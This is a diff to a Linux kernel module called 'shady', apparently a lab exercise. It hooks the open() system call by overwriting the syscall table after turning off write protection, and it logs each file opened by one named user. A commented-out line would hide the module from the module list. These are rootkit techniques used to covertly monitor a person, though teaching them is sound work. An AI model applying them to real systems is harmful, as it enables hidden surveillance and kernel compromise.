@@ -49,6 +49,38 @@ static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
 /* ================================================================ */
+//Use command "uname -a" to find kernel version
+//System.map-3.13.0-45-generic
+//Get address by: sudo grep sys_call_table /boot/System.map-3.13.0-45-generic
+void **sc_table_address = (void*)0xffffffff81801400;
+
+//Create new user by command: useradd {username}
+// read file: /etc/passwd to find uid for mark
+static unsigned int marks_uid = 1001;
+
+/* ================================================================ */
+
+//modifies page table entry
+void set_addr_rw (unsigned long addr) {
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &level);
+  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+}
+
+asmlinkage int (*old_open) (const char*, int, int);
+
+asmlinkage int my_open (const char* file, int flags, int mode)
+{
+   /* YOUR CODE HERE */
+  int ret = -1;
+  unsigned int uid=(unsigned int)current_uid().val;
+  if (uid == marks_uid)
+  {
+    printk(KERN_INFO "Mark is about to open %s \n", file);
+  }
+  ret = old_open(file, flags, mode);
+  return ret;
+}
 
 int 
 shady_open(struct inode *inode, struct file *filp)
@@ -255,7 +287,16 @@ shady_init_module(void)
       goto fail;
     }
   }
-  
+  //turns off write protection
+   set_addr_rw((unsigned long)sc_table_address);
+
+  //replace address
+  old_open = sc_table_address[__NR_open];
+  sc_table_address[__NR_open] = my_open;
+
+  //Hide module
+  //list_del_init(&__this_module.list);  
+
   return 0; /* success */
 
  fail:
@@ -266,6 +307,8 @@ shady_init_module(void)
 static void __exit
 shady_exit_module(void)
 {
+  //change back
+  sc_table_address[__NR_open] = old_open;
   shady_cleanup_module(shady_ndevices);
   return;
 }
